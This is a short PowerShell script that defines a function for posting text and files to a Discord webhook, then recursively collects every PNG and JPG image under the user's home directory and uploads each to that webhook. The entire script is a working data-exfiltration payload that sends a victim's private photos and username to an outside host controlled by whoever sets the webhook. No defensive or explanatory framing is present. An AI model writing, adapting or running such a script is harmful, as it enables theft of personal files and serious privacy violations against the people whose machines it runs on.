function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'YOUR-DISCORD-WEBHOOK'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}


# Enumerate all .png and .jpg files in the current user's home directory and all subdirectories
$Files = Get-ChildItem -Path "$env:HOMEPATH" -Include "*.png","*.jpg" -Recurse

# Iterate through each file
foreach ($File in $Files)
{
    # Get the file name and file path
    $FileName = $File.Name
    $FilePath = $File.FullName

    # Call the Upload-Discord function, passing the file path and file name as arguments
    Upload-Discord -file $FilePath
}
